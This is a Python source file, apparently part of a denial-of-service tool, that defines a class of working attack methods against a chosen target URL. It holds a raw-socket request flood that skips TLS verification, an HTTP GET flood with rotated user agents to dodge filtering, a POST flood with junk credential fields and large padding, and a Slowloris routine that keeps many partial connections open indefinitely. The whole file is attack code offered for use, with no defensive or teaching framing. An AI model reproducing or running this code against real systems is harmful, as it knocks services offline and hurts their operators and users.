#!/usr/bin/env python3
"""
ATTACK METHODS
Various DDoS attack techniques
"""

import random
import time
from urllib.parse import urlparse

class AttackMethods:
    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        
    def request_flood(self, duration=60):
        """Request flood attack"""
        def flood_worker(worker_id, stats):
            import socket
            import ssl
            
            host = self.parsed_url.hostname
            port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
            
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Create socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    
                    # SSL for HTTPS
                    if self.parsed_url.scheme == 'https':
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=host)
                    
                    # Connect
                    sock.connect((host, port))
                    
                    # Generate request
                    path = f"/{random.randint(1000, 9999)}?{random.randint(1, 99999)}"
                    request = f"GET {path} HTTP/1.1\r\n"
                    request += f"Host: {host}\r\n"
                    request += "User-Agent: Mozilla/5.0\r\n"
                    request += "Accept: */*\r\n"
                    request += "Connection: close\r\n"
                    request += "\r\n"
                    
                    # Send and close
                    sock.send(request.encode())
                    sock.close()
                    
                    stats['successful'] += 1
                    
                    time.sleep(random.uniform(0.001, 0.01))
                    
                except Exception:
                    stats['failed'] += 1
                    continue
        
        return flood_worker
    
    def http_get_flood(self, duration=60):
        """HTTP GET flood"""
        def get_flood_worker(worker_id, stats):
            import requests
            
            session = requests.Session()
            session.verify = False
            
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    response = session.get(
                        self.target_url,
                        timeout=2,
                        headers={'User-Agent': self._random_ua()}
                    )
                    
                    if response.status_code < 400:
                        stats['successful'] += 1
                    else:
                        stats['failed'] += 1
                    
                    time.sleep(random.uniform(0.01, 0.05))
                    
                except Exception:
                    stats['failed'] += 1
                    continue
        
        return get_flood_worker
    
    def post_data_flood(self, duration=60):
        """POST data flood"""
        def post_flood_worker(worker_id, stats):
            import requests
            
            session = requests.Session()
            session.verify = False
            
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Generate random POST data
                    data = {
                        'username': self._random_string(10),
                        'password': self._random_string(15),
                        'email': f"{self._random_string(8)}@example.com",
                        'data': 'A' * random.randint(1000, 5000)
                    }
                    
                    response = session.post(
                        self.target_url,
                        data=data,
                        timeout=3,
                        headers={'User-Agent': self._random_ua()}
                    )
                    
                    if response.status_code < 400:
                        stats['successful'] += 1
                    else:
                        stats['failed'] += 1
                    
                    time.sleep(random.uniform(0.05, 0.1))
                    
                except Exception:
                    stats['failed'] += 1
                    continue
        
        return post_flood_worker
    
    def slowloris_attack(self, sockets_per_worker=50):
        """Slowloris attack"""
        def slowloris_worker(worker_id, stats):
            import socket
            
            host = self.parsed_url.hostname
            port = self.parsed_url.port or 80
            
            sockets = []
            
            try:
                # Create multiple sockets
                for i in range(sockets_per_worker):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(4)
                        sock.connect((host, port))
                        
                        # Send partial request
                        request = f"GET /{random.randint(1000, 9999)} HTTP/1.1\r\n"
                        request += f"Host: {host}\r\n"
                        request += "User-Agent: Mozilla/5.0\r\n"
                        request += "Content-Length: 1000000\r\n"
                        request += "\r\n"
                        
                        sock.send(request.encode())
                        sockets.append(sock)
                        stats['connections'] += 1
                        
                    except:
                        continue
                
                # Keep connections alive
                while True:
                    for sock in sockets:
                        try:
                            sock.send(b"X-a: b\r\n")
                        except:
                            pass
                    
                    time.sleep(15)  # Send keep-alive headers
                    
            except KeyboardInterrupt:
                pass
            finally:
                # Cleanup
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
        
        return slowloris_worker
    
    def _random_ua(self):
        """Generate random user agent"""
        ua_list = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15'
        ]
        return random.choice(ua_list)
    
    def _random_string(self, length):
        """Generate random string"""
        import string
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))
